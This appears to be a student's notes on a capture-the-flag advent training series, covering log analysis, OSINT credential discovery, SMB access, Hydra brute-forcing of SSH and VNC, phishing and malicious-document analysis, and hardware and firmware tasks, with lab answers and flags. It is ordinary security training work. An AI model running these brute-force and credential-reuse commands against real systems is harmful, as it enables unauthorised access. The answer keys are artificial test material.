# Day 2 `Log Analysis` Santa's Naughty & Nice Log
/home/sami/Documents/THM/Rooms/Advent_of_Cyber/day5# Day 2  `Log Analysis` Santa's Naughty & Nice Log
Santa’s Security Operations Center (SSOC) has noticed one of their web servers, [santagift.shop](http://santagift.shop/) has been hijacked by the Bandit Yeti APT group. Elf McBlue’s task is to analyse the log files captured from the web server to understand what is happening and track down the Bandit Yeti APT group.

## Learning Objectives
In today’s task, you will:
-   Learn what **log files** are and why they’re useful
-   Understand what valuable information log files can contain
-   Understand some **common locations** these logs file can be found
-   Use some basic Linux commands to start analyzing log files for valuable information
-   Help Elf McBlue track down the Bandit Yeti APT!
## What Are Log Files and Why Are They Useful
Log files are files that contain **historical records** of events and other data from an application. Some common examples of events that you may find in a log file:  
-   Login attempts or failures
-   Traffic on a network
-   Things (website URLs, files, etc.) that have been accessed
-   Password changes
-   Application errors (used in debugging)
-   _and many, many more_
By making a historical record of events that have happened, log files are extremely important pieces of evidence when investigating:
-   **What** has happened?
-   **When** has it happened?
-   **Where** has it happened?
-   **Who** did it? Were they successful?
-   **What** is the result of this action?
For example, a systems administrator may want to log the traffic happening on a network. We can use logging to answer the questions above in a given scenario:  

_A user has reportedly accessed inappropriate material on a University network._ With logging in place, a systems administrator could determine the following:

	What has happened?
		A user is confirmed to have accessed inappropriate material on the University network.
		
	When has it happened?
		It happened at 12:08 on Tuesday, 01/10/2022.
		
	Where has it happened?
		It happened from a device with an IP address (an identifier on the network) of 10.3.24.51.
		
	Who did it? Were they successful?
		The user was logged into the university network with their student account.
		
	What is the result of the action?
		The user was able to access _inappropriatecontent.thm_.

## What Does a Log File Look Like?
Log files come in all shapes and sizes. However, a useful log will contain at least some of the following attributes:

1.  A timestamp of the event (I.e. Date & Time)
2.  The name of the service that is generating the logfile (I.e. SSH is a remote device management protocol that allows a user to login into a system remotely)
3.  The actual event the service logs (i.e., in the event of a failed authentication, what credentials were tried, and by whom? (IP address)).
## Common Locations of Log Files
### Windows
Windows features an in-built application that allows us to access historical records of events that happen. The **Event Viewer**.
These events are usually categorised into the following:
Application:
	This category contains all the events related to applications on the system. For example, you can determine when services or applications are stopped and started and why.
Security:
	This category contains all of the events related to the system's security. For example, you can see when a user logs in to a system or accesses the credential manager for passwords.
Setup:
	This category contains all of the events related to the system's maintenance. For example, Windows update logs are stored here.
System:
	This category contains all the events related to the system itself. This category of events contains logs that relate to changes in the system itself. For example, when the system is powered on or off or when devices such as USB drives are plugged-in or removed.
### Linux (Ubuntu/Debian)
On this flavour of Linux, operating system log files (and often software-specific such as apache2) are located within the `/var/log` directory. We can use the `ls` in the `/var/log` directory to list all the log files located on the system:
```sh
sami@bt:~/Documents/THM/Rooms/Advent_of_Cyber$ ls -hla /var/log 
total 309M
drwxr-xr-x  14 root              root            4.0K Dec  3 09:51 .
drwxr-xr-x  11 root              root            4.0K Oct 31 09:34 ..
-rw-r--r--   1 root              root               0 Dec  1 00:00 alternatives.log
-rw-r--r--   1 root              root            114K Nov 13 23:17 alternatives.log.1
drwxr-xr-x   2 root              root            4.0K Dec  1 00:00 apt
-rw-r-----   1 root              adm             110K Dec  3 10:17 auth.log
-rw-------   1 root              root            3.7K Dec  3 09:50 boot.log
-rw-------   1 root              root            3.5K Dec  3 00:00 boot.log.1
-rw-------   1 root              root            3.5K Dec  2 00:00 boot.log.2
-rw-------   1 root              root             13K Dec  1 00:00 boot.log.3
-rw-rw----   1 root              utmp               0 Dec  1 00:00 btmp
-rw-rw----   1 root              utmp             384 Nov 28 16:16 btmp.1
-rw-r-----   1 root              adm              28K Dec  3 10:17 cron.log
-rw-r-----   1 root              adm             1.1M Nov  4 16:15 daemon.log
-rw-r-----   1 root              adm             115K Nov  4 16:15 debug
-rw-r--r--   1 root              root               0 Dec  1 00:00 dpkg.log
-rw-r--r--   1 root              root            1.2M Nov 27 00:09 dpkg.log.1
-rw-r--r--   1 root              root            3.3K Oct 31 09:34 faillog
-rw-r--r--   1 root              root            4.1K Oct 31 10:50 fontconfig.log
drwx--x--x   2 root              Debian-gdm      4.0K Oct 31 09:46 gdm3
drwxr-xr-x   3 root              root            4.0K Oct 31 09:45 installer
drwxr-sr-x+  3 root              systemd-journal 4.0K Oct 31 09:46 journal
-rw-r-----   1 root              adm             965K Dec  3 09:57 kern.log
-rw-rw-r--   1 root              utmp            286K Nov 29 16:20 lastlog
-rw-r-----   1 root              adm             300M Nov  4 16:15 messages
drwxr-xr-x   2 root              root            4.0K Jul  5 10:22 openvpn
drwxrwxr-t   2 root              postgres        4.0K Oct 31 09:43 postgresql
drwx------   2 root              root            4.0K Oct 31 09:36 private
lrwxrwxrwx   1 root              root              39 Oct 31 09:36 README -> ../../usr/share/doc/systemd/README.logs
drwxr-xr-x   3 root              root            4.0K Oct 31 09:41 runit
drwxr-x---   2 root              adm             4.0K Oct 26 22:27 samba
drwx------   2 speech-dispatcher root            4.0K Oct 23 13:29 speech-dispatcher
-rw-r-----   1 root              adm             3.9M Dec  3 10:22 syslog
drwxr-xr-x   2 root              root            4.0K Nov 29 16:06 sysstat
drwxr-x---   2 root              adm             4.0K Oct 31 16:31 unattended-upgrades
-rw-r-----   1 root              adm             1.8M Dec  3 10:18 user.log
-rw-rw-r--   1 root              utmp             70K Dec  3 09:51 wtmp
-rw-r--r--   1 root              root             29K Dec  3 09:51 Xorg.0.log
-rw-r--r--   1 root              root             29K Dec  2 23:15 Xorg.0.log.old
-rw-r--r--   1 root              root             26K Dec  3 10:18 Xorg.1.log
-rw-r--r--   1 root              root             28K Dec  3 01:09 Xorg.1.log.old
```
The following table highlights some important log files:
**Authentication**:
	This log file contains all authentication (log in). This is usually attempted either **remotely** or on the **system itself** (i.e., accessing another user after logging in).
**Package Management**:
	This log file contains all events related to **package management** on the system. When installing a new software (a package), this is logged in this file. This is useful for **debugging** or **reverting changes** in case this installation causes unintended behaviour on the system.
**Syslog**:
	This log file contains all events related to things happening in the **system's background**. For example, **crontabs executing**, **services starting and stopping**, or other **automatic behaviours** such as **log rotation**. This file can help debug problems.
**Kernel**:
	This log file contains all events related to kernel events on the system. For example, changes to the kernel, or output from devices such as networking equipment or physical devices such as USB devices.
## Looking Through Log Files
Log files can quickly contain many events and hundreds, if not thousands, of entries. The difficulty in analysing log files is separating useful information from useless. Tools such as Splunk are software solutions known as **Security Information and Event Management (SIEM)** is dedicated to aggregating logs for analysis. Listed in the table below are some of the advantages and disadvantages of these platforms:
Advantage:
- SIEM platforms are dedicated services for log analysis.
- SIEM platforms can collect a wide variety of logs - from devices to networking equipment.
- SIEM platforms allow for advanced, in-depth analysis of many log files at once.
Disadvantage:
- Commercial SIEM platforms are expensive to license and run.
- SIEM platforms take considerable time to properly set up and configure.
- SIEM platforms require training to be properly used.
Luckily for us, most operating systems already come with a set of tools that allow us to search through log files. In this room, we will be using the `grep` command on Linux.
## [[Grep]] 101
we can provide some options to `grep` to enable us to have more control over the results of grep. The table below contains some of the common options that you may wish to use with `grep`.
Option
- -i : Perform a case insensitive search. For example, "helloworld" and "HELLOWORLD" will return the same results Example: `grep -i "helloworld" log.txt` and `grep -i "HELLOWORLD" log.txt` will return the same matches.
- -E : Searches using regex (regular expressions). For example, we can search for lines that contain either "thm" or "tryhackme" Example: `grep -E "thm|tryhackme" log.txt`
- -r : Search recursively. For example, search all of the files in a directory for this value. Example: `grep -r "helloworld" mydirectory`
Further options available in g_rep_ can be searched within _grep_'s manual page via `man grep`
## Practical
If you wish, you can use the following credentials to access the machine using SSH (remember to connect to the VPN first):

-   IP address: 10.10.243.49
-   Username: elfmcblue
-   Password: tryhackme!

Use the knowledge you have gained in today's task to help Elf McBlue track down the Bandit Yeti APT by answering the questions below.
## Exercise
Find the important list:
```sh
elfmcblue@day-2-log-analysis:~$ grep -w "200" webserver.log | grep -E "txt|lst"
10.10.249.191 - - [18/Nov/2022:12:34:39 +0000] "GET /santaslist.txt HTTP/1.1" 200 133872 "-" "Wget/1.19.4 (linux-gnu)"
```
# Day 3 `OSINT` Nothing escapes detective McRed
## Questions
What is the name of the Registrar for the domain santagift.shop?
```sh
sami@bt:~/Documents/THM/Rooms/Advent_of_Cyber/day3$ cat whoislookup.txt 
...
Registrar: Namecheap, Inc.
...
```
Find the website's source code (repository) on [github.com](https://github.com/) and open the file containing sensitive credentials. Can you find the flag?  
![[Pasted image 20221203235815.png]]
	Searching for the username and password:
	![[Pasted image 20221203235930.png]]
`ubuntu:S@nta2022`.
What is the name of the file containing passwords?  
`config.php`
What is the name of the QA server associated with the website?  
`qa.santagift.shop` in the first image.
What is the DB_PASSWORD that is being reused between the QA and PROD environments?  
`S@nta2022`
# Day 4 `Scanning` Scanning through the snow
During the investigation of the downloaded GitHub repo (OSINT task), elf Recon McRed identified a URL `qa.santagift.shop` that is probably used by all the elves with admin privileges to add or delete gifts on the Santa website. The website has been pulled down for maintenance, and now Recon McRed is scanning the server to see how it's been compromised. Can you help McRed scan the network and find the reason for the website compromise?
Elf Recon McRed ran Nmap and Nikto tools against the QA server to find the list of open ports and vulnerabilities. He noticed a Samba service running - hackers can gain access to the system through loosely protected Samba share folders that are not protected over the network. He knows that The Bandit Yeti APT got a few lists of admin usernames and passwords for `qa.santagift.shop` using OSINT techniques.

Username and password obtained from day3:
`ubuntu:S@nta2022`

## `smbclient` login 
```sh
sami@bt:~/Documents/THM/Rooms/Advent_of_Cyber/day4$ smbclient -U ubuntu -L qa.santagift.shop      
Password for [WORKGROUP\ubuntu]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Samba on Ubuntu
	admins          Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (ip-10-10-111-75 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            IP-10-10-111-75
sami@bt:~/Documents/THM/Rooms/Advent_of_Cyber/day4$ smbclient -U ubuntu //qa.santagift.shop/admins    
Password for [WORKGROUP\ubuntu]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 10 07:44:30 2022
  ..                                  D        0  Wed Nov  9 19:43:21 2022
  flag.txt                            A       23  Wed Nov  9 19:55:58 2022
  userlist.txt                        A      111  Thu Nov 10 07:44:29 2022

		40581564 blocks of size 1024. 38197528 blocks available
smb: \> 
^c

sami@bt:~/Documents/THM/Rooms/Advent_of_Cyber/day4$ smbclient -U ubuntu //qa.santagift.shop/sambashare
Password for [WORKGROUP\ubuntu]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 10 07:46:55 2022
  ..                                  D        0  Wed Nov  9 19:43:21 2022
  test                                N        0  Thu Nov 10 07:46:55 2022

		40581564 blocks of size 1024. 38197528 blocks available
smb: \> 
```
## the userlist
```sh
sami@bt:~/Documents/THM/Rooms/Advent_of_Cyber/day4$ cat userlist.txt
USERNAME	PASSWORD
santa		santa101
santahr		santa25
santaciso	santa30
santatech	santa200
santaaccounts	santa400
```
# Day 5 `Brute-Forcing` He knows when you're awake
## Enumeration
### nmap scan
```sh 
sami@bt:~/Documents/THM/Rooms/Advent_of_Cyber/day5$ sudo nmap -A -p- -oN nmap_results.txt day5.thm
[sudo] password for sami: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-06 00:34 EET
Nmap scan report for day5.thm (10.10.79.200)
Host is up (0.055s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 78ebbe14ee9ec002beda79d36ded68a2 (RSA)
|   256 43c5a44f78f5397e93edee89cd5da874 (ECDSA)
|_  256 00dd7b5c7c75a3dc5bed80aa8909b0cc (ED25519)
5900/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    VNC Authentication (2)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=12/6%OT=22%CT=1%CU=40235%PV=Y%DS=2%DC=T%G=Y%TM=638E723
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   54.95 ms 10.11.0.1
2   55.17 ms day5.thm (10.10.79.200)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.07 seconds
```
#### Notes
- `ssh` is open on port `22`
- `vnc` is open on port `5900`
### SSH login with the obtained creds 
```txt
ubuntu:S@nta2022
santa:santa101
santahr:santa25
santaciso:santa30
santatech:santa200
santaaccounts:santa400
```
```sh
sami@bt:~/Documents/THM/Rooms/Advent_of_Cyber/day5$ hydra -u -V -f -L username.txt -P password.txt ssh://day5.thm 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-06 00:46:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:6/p:6), ~3 tries per task
[DATA] attacking ssh://day5.thm:22/
[ATTEMPT] target day5.thm - login "ubuntu" - pass "S@nta2022" - 1 of 36 [child 0] (0/0)
[ATTEMPT] target day5.thm - login "santa" - pass "S@nta2022" - 2 of 36 [child 1] (0/0)
[ATTEMPT] target day5.thm - login "santahr" - pass "S@nta2022" - 3 of 36 [child 2] (0/0)
[ATTEMPT] target day5.thm - login "santaciso" - pass "S@nta2022" - 4 of 36 [child 3] (0/0)
[ATTEMPT] target day5.thm - login "santatech" - pass "S@nta2022" - 5 of 36 [child 4] (0/0)
[ATTEMPT] target day5.thm - login "santaaccounts" - pass "S@nta2022" - 6 of 36 [child 5] (0/0)
[ATTEMPT] target day5.thm - login "ubuntu" - pass "santa101" - 7 of 36 [child 6] (0/0)
[ATTEMPT] target day5.thm - login "santa" - pass "santa101" - 8 of 36 [child 7] (0/0)
[ATTEMPT] target day5.thm - login "santahr" - pass "santa101" - 9 of 36 [child 8] (0/0)
[ATTEMPT] target day5.thm - login "santaciso" - pass "santa101" - 10 of 36 [child 9] (0/0)
[ATTEMPT] target day5.thm - login "santatech" - pass "santa101" - 11 of 36 [child 10] (0/0)
[ATTEMPT] target day5.thm - login "santaaccounts" - pass "santa101" - 12 of 36 [child 11] (0/0)
[ATTEMPT] target day5.thm - login "ubuntu" - pass "santa25" - 13 of 36 [child 12] (0/0)
[ATTEMPT] target day5.thm - login "santa" - pass "santa25" - 14 of 36 [child 13] (0/0)
[ATTEMPT] target day5.thm - login "santahr" - pass "santa25" - 15 of 36 [child 14] (0/0)
[ATTEMPT] target day5.thm - login "santaciso" - pass "santa25" - 16 of 36 [child 15] (0/0)
[ATTEMPT] target day5.thm - login "santatech" - pass "santa25" - 17 of 40 [child 0] (0/4)
[ATTEMPT] target day5.thm - login "santaaccounts" - pass "santa25" - 18 of 40 [child 6] (0/4)
[ATTEMPT] target day5.thm - login "ubuntu" - pass "santa30" - 19 of 40 [child 5] (0/4)
[RE-ATTEMPT] target day5.thm - login "santa" - pass "santa30" - 19 of 40 [child 6] (0/4)
[ATTEMPT] target day5.thm - login "santahr" - pass "santa30" - 20 of 40 [child 7] (0/4)
[RE-ATTEMPT] target day5.thm - login "santaciso" - pass "santa30" - 20 of 40 [child 5] (0/4)
[ATTEMPT] target day5.thm - login "santatech" - pass "santa30" - 21 of 40 [child 13] (0/4)
[ATTEMPT] target day5.thm - login "santaaccounts" - pass "santa30" - 22 of 40 [child 1] (0/4)
[RE-ATTEMPT] target day5.thm - login "ubuntu" - pass "santa200" - 22 of 40 [child 13] (0/4)
[RE-ATTEMPT] target day5.thm - login "santa" - pass "santa200" - 22 of 40 [child 1] (0/4)
[ATTEMPT] target day5.thm - login "santahr" - pass "santa200" - 23 of 40 [child 4] (0/4)
[ATTEMPT] target day5.thm - login "santaciso" - pass "santa200" - 24 of 40 [child 8] (0/4)
[ATTEMPT] target day5.thm - login "santatech" - pass "santa200" - 25 of 40 [child 2] (0/4)
[RE-ATTEMPT] target day5.thm - login "santaaccounts" - pass "santa200" - 25 of 40 [child 4] (0/4)
[RE-ATTEMPT] target day5.thm - login "ubuntu" - pass "santa400" - 25 of 40 [child 2] (0/4)
[ATTEMPT] target day5.thm - login "santa" - pass "santa400" - 26 of 40 [child 9] (0/4)
[ATTEMPT] target day5.thm - login "santahr" - pass "santa400" - 27 of 40 [child 3] (0/4)
[ATTEMPT] target day5.thm - login "santaciso" - pass "santa400" - 28 of 40 [child 15] (0/4)
[ATTEMPT] target day5.thm - login "santatech" - pass "santa400" - 29 of 40 [child 5] (0/4)
[ATTEMPT] target day5.thm - login "santaaccounts" - pass "santa400" - 30 of 40 [child 15] (0/4)
[REDO-ATTEMPT] target day5.thm - login "santatech" - pass "santa101" - 31 of 40 [child 8] (1/4)
[REDO-ATTEMPT] target day5.thm - login "santaaccounts" - pass "santa101" - 32 of 40 [child 13] (2/4)
[REDO-ATTEMPT] target day5.thm - login "ubuntu" - pass "santa25" - 33 of 40 [child 6] (3/4)
[REDO-ATTEMPT] target day5.thm - login "santahr" - pass "santa25" - 34 of 40 [child 3] (4/4)
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-06 00:46:46
```
Reading the room, I found username:`alexander`  is given for `ssh` login.
```sh
sami@bt:~/Documents/THM/Rooms/Advent_of_Cyber/day5$ hydra -u -V -f -l alexander -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://day5.thm
...
[22][ssh] host: day5.thm   login: alexander   password: sakura
...
```
### `ssh` login to `day5.thm`
```sh
sami@bt:~/Documents/THM/Rooms/Advent_of_Cyber/day5$ ssh alexander@day5.thm                           
alexander@ip-10-10-79-200:~$ 
```
#### Notes
- Didn't do intense search and switched to attacking the [[VNC]] (Virtual Network Computing) server.
### `vnc` brute-forcing using [[hydra]]
```sh
sami@bt:~/Documents/THM/Rooms/Advent_of_Cyber/day5$ hydra -u -V -f  -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt vnc://10.10.79.200
...
[5900][vnc] host: 10.10.79.200   password: 1q2w3e4r
...
```
## Exercise
Given: In the terminal window below, we use Hydra to find the password of the username `alexander` that allows access via SSH.
	
Use Hydra to find the VNC password of the target with IP address `10.10.79.200`. What is the password?
	1q2w3e4r
Using a VNC client on the AttackBox, connect to the target of IP address `10.10.79.200`. What is the flag written on the target’s screen?  
	thm{I_SEE_YOUR_SCREEN}
If you liked the topics presented in this task, check out these rooms next: [Protocols and Servers 2](https://tryhackme.com/room/protocolsandservers2), [Hydra](https://tryhackme.com/room/hydra), [Password Attacks](https://tryhackme.com/room/passwordattacks), [John the Ripper](https://tryhackme.com/room/johntheripper0).
# Day 6 `Email Analyzis` It's beginning to look a lot like phishing
## Analyzing the email
- Subject: Urgent: Blue section is down. Switch to the load share plan!
- From: Chief Elf <chief.elf@santaclaus.thm>
- Date: Tue, 6 Dec 2022 00:00:01 +0000
- To: elves.all@santaclaus.thm <elves.all@santaclaus.thm>
- Message-Id: <QW9DMjAyMl9FbWFpbF9BbmFseXNpcw==>
- Return-Path: <murphy.evident@bandityeti.thm>
```sh
ubuntu@ip-10-10-57-46:~/Desktop$ emlAnalyzer -i Urgent\:.eml --header
 ==============
 ||  Header  ||
 ==============
X-Pm-Content-Encryption.....end-to-end
X-Pm-Origin.................internal
Subject.....................Urgent: Blue section is down. Switch to the load share plan!
From........................Chief Elf <chief.elf@santaclaus.thm>
Date........................Tue, 6 Dec 2022 00:00:01 +0000
Mime-Version................1.0
Content-Type................multipart/mixed;boundary=---------------------03edd9c682a0c8f60d54b9e4bb86659f
To..........................elves.all@santaclaus.thm <elves.all@santaclaus.thm>
X-Attached..................Division_of_labour-Load_share_plan.doc
Message-Id..................<QW9DMjAyMl9FbWFpbF9BbmFseXNpcw==>
X-Pm-Spamscore..............3
Received....................from mail.santaclaus.thm by mail.santaclaus.thm; Tue, 6 Dec 2022 00:00:01 +0000
X-Original-To...............elves.all@santaclaus.thm
Return-Path.................<murphy.evident@bandityeti.thm>
Delivered-To................elves.all@santaclaus.thm
```
- From........................Chief Elf <chief.elf@santaclaus.thm>
- To..........................elves.all@santaclaus.thm <elves.all@santaclaus.thm>
- X-Pm-Spamscore..............3
- Message-Id..................<QW9DMjAyMl9FbWFpbF9BbmFseXNpcw==>
![[Pasted image 20221207002347.png]]
```sh
sami@bt:~/Documents/THM/Rooms/Advent_of_Cyber/day6$ echo 'QW9DMjAyMl9FbWFpbF9BbmFseXNpcw==' | base64 -d
AoC2022_Email_Analysis       
```
```sh
ubuntu@ip-10-10-57-46:~/Desktop/eml_attachments$ sha256sum Division_of_labour-Load_share_plan.doc 
0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467  Division_of_labour-Load_share_plan.doc
```
![[Pasted image 20221207002504.png]]
![[Pasted image 20221207002542.png]]
![[Pasted image 20221207002330.png]]
# Day 7 `CyberChef` Maldocs roasting on an open file
## Intro
In the previous task, we learned that McSkidy was indeed a victim of a spearphishing campaign that also contained a suspicious-looking document `Division_of_labour-Load_share_plan.doc`. McSkidy accidentally opened the document, and it's still unknown what this document did in the background. McSkidy has called on the in-house expert **Forensic McBlue** to examine the malicious document and find the domains it redirects to. Malicious documents may contain a suspicious command to get executed when opened, an embedded malware as a dropper (malware installer component), or may have some C2 domains to connect to.
## Learning Objectives
-   What is CyberChef
-   What are the capabilities of CyberChef
-   How to leverage CyberChef to analyze a malicious document
-   How to deobfuscate, filter and parse the data
## Using CyberChef for mal doc analysis
1) Add the File to CyberChef
2) Extract strings
	1) Strings are ASCII and Unicode-printable sequences of characters within a file. We are interested in the strings embedded in the file that could lead us to suspicious domains. Use the `strings` function from the left panel to extract the strings by dragging it to panel 3 and selecting **All printable chars** as shown below: ![[Pasted image 20221207234916.png]]
3) Remove Pattern
	1) Attackers often add random characters to obfuscate the actual value. If we examine, we can find some repeated characters `[ _ ]`. As these characters are common in different places, we can use regex **(regular expressions)** within the `Find / Replace` function to find and remove these repeated characters.

To use regex, we will put characters within the square brackets `[ ]` and use backslash `\` to escape characters. In this case, the final regex will be `[**\[\]\n_**]` where `\n` represents **the Line feed**, as shown below: ![[Pasted image 20221207234930.png]] It's evident from the result that we are dealing with a PowerShell script, and it is using base64 Encoded string to hide the actual code.
4) Drop Bytes
	1) To get access to the base64 string, we need to remove the extra bytes from the top. Let's use the `Drop bytes` function and keep increasing the number until the top bytes are removed. ![[Pasted image 20221208000448.png]]
5) Decode base64
	1) ![[Pasted image 20221208000658.png]]
6) Decode UTF-16
	1) The base64 decoded result clearly indicates a PowerShell script which seems like an interesting finding. In general, the PowerShell scripts use the `Unicode UTF-16LE` encoding by default. We will be using the `Decode text` function to decode the result into UTF-16E, as shown below: ![[Pasted image 20221208000716.png]]
7) Find and Remove Common Patterns
	1) Forensic McBlue observes various repeated characters  ``' ( ) + ' ` "`` within the output, which makes the result a bit messy. Let's use regex in the `Find/Replace` function again to remove these characters, as shown below. The final regex will be ``['()+'"`]``. ![[Pasted image 20221208000733.png]]
8) Find and Replace
	1) ![[Pasted image 20221208000946.png]]
9) Extract URLs
	1) ![[Pasted image 20221208001015.png]]
10) Split URLs with @
	1) ![[Pasted image 20221208001034.png]]
11) Defand URL
	1) ![[Pasted image 20221208001045.png]]
## Questions
What is the version of CyberChef found in the attached VM?
	9.49.0
How many recipes were used to extract URLs from the malicious doc?  
	10
We found a URL that was downloading a suspicious file; what is the name of that malware?  
	mysterygift.exe
What is the last defanged URL of the bandityeti domain found in the last step?  
	hxxps[://]cdn[.]bandityeti[.]THM/files/index/
What is the ticket found in one of the domains? (Format: Domain/<GOLDEN_FLAG>)
	THM_MYSTERY_FLAG

# Day 8 `Smart Contract` Last Christmas I gave you my ETH
# Day 19 `Hardware Hacking` Wiggles go brrr
## Learning Objectives
-   How data is sent via electrical wires in low-level hardware
-   Hardware communication protocols
-   How to analyse hardware communication protocols
-   Reading USART data from a logic capture
## Welcome to the Matrix
Hardware hacking is often shrouded in mystery and seen as a super complex topic. While there are a lot of in-depth complex hardware hacking components, getting our feet wet is actually pretty simple. Computers today are incredibly powerful. This allows them to build additional features and safety measures into their communication protocols to ensure that messages are transmitted reliably. Think about the Transmission Control Protocol (TCP), which has multiple redundancies in place! It even sends three full packets just to start its communication!

In the world of microchips, we often don't have this luxury. To make sure our communication protocols are efficient as possible, we need to keep them as simple as possible. To do that, we need to enter the world of 0s and 1s. This then begs the question, how does hardware take electricity and generate signals? In this task, we will focus on digital communication. For hardware communication, we use a device called a Logic Analyser to analyse the signals. This device can be connected to the actual electrical wires that are used for communication between two devices that will capture and interpret the signals being sent. In this task, we will use a logic analyser to determine the communication between two devices in the rogue implant.
## Questions
- What device can be used to probe the signals being sent on electrical wires between two devices?
	logic analyser
- USART is faster than SPI for communication? (Yea,Nay)
	nay
- USART communication uses fewer wires than SPI? (Yea,Nay)
	Yea
- USART is faster than I2C for communication? (Yea,Nay)
	nay
- I2C uses more wires than SPI for communication? (Yea,Nay)
	nay
- SPI is faster than I2C for communication? (Yea,Nay)
	yea
- What is the maximum number of devices that can be connected on a single pair of I2C lines?
	1008
- What is the new baud rate that is negotiated between the microprocessor and ESP32 chip?
	9600
- What is the flag that is transmitted once the new baud rate was accepted?
	- ![[Pasted image 20221225212302.png]]
	- ![[Pasted image 20221225212325.png]]
	- thm{hacking.hardware.is.fun}
# Day 20 `Firmware` Binwalkin’ around the Christmas tree
`fmk/rootfs/gpg/private.key`gpg 
## Questions
- What is the flag value after reversing the file firmwarev2.2-encrypted.gpg?
	Note: The flag contains underscores - if you're seeing spaces, the underscores might not be rendering.
	thm{we_got_the_firmware_code}
- What is the Paraphrase value for the binary firmwarev1.0_unsigned?
	Santa@2022
- After reversing the encrypted firmware, can you find the build number for rootfs?
	2.6.31
# Day 21 `MQTT`
## Enumeration
### ping scan
```sh
❯ ping 10.10.99.109
PING 10.10.99.109 (10.10.99.109) 56(84) bytes of data.
64 bytes from 10.10.99.109: icmp_seq=1 ttl=63 time=55.1 ms
^C
--- 10.10.99.109 ping statistics ---
2 packets transmitted, 1 received, 50% packet loss, time 1001ms
rtt min/avg/max/mdev = 55.141/55.141/55.141/0.000 ms
```
### nmap scan
```sh
❯ sudo nmap -A -p- -oN nmap_results.txt 10.10.99.109
[sudo] password for sami: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-26 14:55 EET
Nmap scan report for 10.10.99.109
Host is up (0.055s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE                 VERSION
22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fb30d3cbfc4282adba64bdd9f5ae09fe (RSA)
|   256 a2d39a45f2f25508f8be2eed13b78a85 (ECDSA)
|_  256 b4632fa3c0d1d6cc7eb2355bd85bd856 (ED25519)
80/tcp   open  http                    WebSockify Python/3.8.10
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: WebSockify Python/3.8.10
|     Date: Mon, 26 Dec 2022 12:55:33 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 472
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 405</p>
|     <p>Message: Method Not Allowed.</p>
|     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 501 Unsupported method ('OPTIONS')
|     Server: WebSockify Python/3.8.10
|     Date: Mon, 26 Dec 2022 12:55:33 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 500
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
